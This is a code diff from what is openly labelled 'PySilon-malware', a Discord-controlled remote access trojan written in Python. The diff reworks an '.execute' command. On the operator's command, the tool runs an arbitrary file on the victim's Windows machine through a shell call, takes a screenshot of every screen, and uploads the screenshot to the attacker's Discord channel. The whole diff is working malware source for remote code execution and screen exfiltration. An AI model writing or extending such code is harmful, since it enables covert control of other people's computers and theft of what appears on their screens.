@@ -1,6 +1,9 @@
+import resources.modules.misc as pysilon_misc
 from bs4 import BeautifulSoup
 from zipfile import ZipFile
 from getpass import getuser
+from PIL import ImageGrab
+import subprocess
 import requests
 import os
 
@@ -174,19 +177,27 @@ async def create_directory(ctx, path=None):
 @client.command(name="execute")
 async def execute_file(ctx, file_to_exec=None):
     await ctx.message.delete()
+
+    async def execution(ctx, file_to_exec):
+        try:
+            subprocess.run('start "" "' + file_to_exec + '"', shell=True)
+            await asyncio.sleep(1)
+            ImageGrab.grab(all_screens=True).save('ss.png')
+            await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time() + ' `[Executed: ' + file_to_exec + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
+            subprocess.run('del ss.png', shell=True)
+            await ctx.send('```Successfully executed: ' + file_to_exec + '```')
+        except Exception as e:
+            await ctx.send(f'```❗ Something went wrong...```\n{str(e)}')
+
     if file_to_exec != None:
-        if os.path.exists(file_to_exec):
-            try:
-                subprocess.run('start "" "' + file_to_exec + '"', shell=True)
-                await asyncio.sleep(1)
-                ImageGrab.grab(all_screens=True).save('ss.png')
-                await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time() + ' `[Executed: ' + file_to_exec + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
-                subprocess.run('del ss.png', shell=True)
-                await ctx.send('```Successfully executed: ' + file_to_exec + '```')
-            except Exception as e:
-                await ctx.send(f'```❗ Something went wrong...```\n{str(e)}')
+        if os.path.exists('/'.join(working_directory) + '/' + file_to_exec):
+            await execution(ctx, '/'.join(working_directory) + '/' + file_to_exec)
+        elif os.path.exists(file_to_exec):
+            await execution(ctx, file_to_exec) 
         else:
-            await ctx.send('```❗ File or directory not found.```')
+            embed = discord.Embed(title="📛 Error",description=f'```File or directory not found!```', colour=discord.Colour.red())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await ctx.send(embed=embed)
     else:
         embed = discord.Embed(title="📛 Error",description=f'```Syntax: .execute <path/to/file>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
